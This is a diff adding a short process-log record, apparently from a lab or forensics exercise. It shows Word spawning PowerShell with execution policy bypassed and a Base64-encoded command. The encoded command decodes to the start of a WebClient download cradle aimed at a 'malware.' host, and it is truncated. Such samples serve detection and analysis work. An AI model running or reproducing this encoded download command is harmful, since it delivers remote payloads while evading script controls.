@@ -1,0 +1,6 @@
+Process: powershell.exe
+PID: 6040
+User: LAB\contractor
+CommandLine: powershell.exe -NoProfile -ExecutionPolicy Bypass -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbQBhAGwAdwBhAHIAZQAuAA==
+
+Parent: winword.exe (PID 6012)
